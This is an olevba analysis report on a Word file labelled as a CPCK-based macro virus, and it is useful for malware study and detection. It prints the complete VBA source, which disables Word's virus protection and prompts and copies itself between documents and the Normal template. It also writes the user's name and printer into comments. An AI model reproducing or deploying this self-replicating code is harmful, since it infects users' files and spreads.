olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.CPCK-based-890f5003c2c8b19ff8efc261c5d62e72035bf5fc
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.CPCK-based-890f5003c2c8b19ff8efc261c5d62e72035bf5fc - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Sub AutoClose()
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
On Error Resume Next
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Options.ConfirmConversions = 0
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Options.SaveNormalPrompt = 0
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Options.VirusProtection = 0
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
DH62 = ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
MF63 = NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.CountOfLines
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Application.EnableCancelKey = 0
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
If DH62 > 0 And MF63 > 0 Then GoTo EJ47
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
If DH62 = 0 Then
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Set JH33 = ActiveDocument.VBProject.VBComponents.Item(1)
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
MI69 = True
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
End If
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
If MF63 = 0 Then
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Set JH33 = NormalTemplate.VBProject.VBComponents.Item(1)
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
MT67 = True
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
End If
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
If MT67 <> True And MI69 <> True Then GoTo EJ47
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
If MT67 = True Then JH33.CodeModule.AddFromString ("Sub AutoClose()" & vbCr & ActiveDocument.VBProject.VBComponents.Item(1).CodeModule.Lines(2, DH62 - 1))
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
If MI69 = True Then JH33.CodeModule.AddFromString ("Sub AutoOpen()" & vbCr & NormalTemplate.VBProject.VBComponents.Item(1).CodeModule.Lines(2, MF63 - 1))
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
With JH33.CodeModule
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
For x = 2 To (JH33.CodeModule.CountOfLines - 1) Step 2
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
.replaceline x, "'" & Application.UserName & Application.UserInitials & Application.ActiveWindow & Application.ActiveDocument & Application.ActivePrinter & Now
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
Next x
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
End With
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
EJ47:
'Andreas MarxAMCLADF881CLADF881.DOCHP DeskJet 895Cxi on \\SERVER\TINTE-A4-RAW23.07.01 15:35:37
End Sub
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |AutoOpen            |Runs when the Word document is opened        |
|AutoExec  |AutoClose           |Runs when the Word document is closed        |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|AddFromString       |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

